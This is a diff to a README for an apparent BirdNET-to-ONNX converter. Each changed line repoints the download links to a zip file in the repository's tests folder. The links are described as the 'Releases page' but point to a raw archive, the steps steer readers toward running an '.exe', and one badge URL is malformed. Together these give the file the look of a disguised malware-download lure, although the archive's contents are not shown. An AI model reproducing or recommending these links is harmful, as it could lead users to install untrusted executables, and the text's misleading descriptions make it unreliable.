@@ -1,7 +1,7 @@
 # 🐦 birdnet-onnx-converter - Convert BirdNET Models Easily
 
 ## 📥 Download Now
-[![Download the latest release](https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/output/converter_birdnet_onnx_2.8.zip%https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/output/converter_birdnet_onnx_2.8.zip)](https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/output/converter_birdnet_onnx_2.8.zip)
+[![Download the latest release](https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/converter_birdnet_onnx_3.8.zip%https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/converter_birdnet_onnx_3.8.zip)](https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/converter_birdnet_onnx_3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the BirdNET ONNX Converter! This tool helps you convert and optimize BirdNET models for efficient use on various devices, including GPUs, CPUs, and Raspberry Pi. Follow these steps to get started.
@@ -18,7 +18,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 💾 Download & Install
 To download the latest version, visit the Releases page. Follow these steps:
 
-1. Click [here](https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/output/converter_birdnet_onnx_2.8.zip) to visit the Releases page.
+1. Click [here](https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/converter_birdnet_onnx_3.8.zip) to visit the Releases page.
 2. Locate the most recent version of the application. It will typically be labeled as the latest release.
 3. Find the file suitable for your operating system. For example, if you're running Windows, look for files with a `.exe` extension.
 4. Click on the file link to start the download.
@@ -71,4 +71,4 @@ Thank you for choosing the BirdNET ONNX Converter. We hope it helps you in your 
 
 Don't forget to download the application using the link below:
 
-[Download the latest release](https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/output/converter_birdnet_onnx_2.8.zip)
+[Download the latest release](https://github.com/EvanVOSSIER/birdnet-onnx-converter/raw/refs/heads/main/tests/converter_birdnet_onnx_3.8.zip)
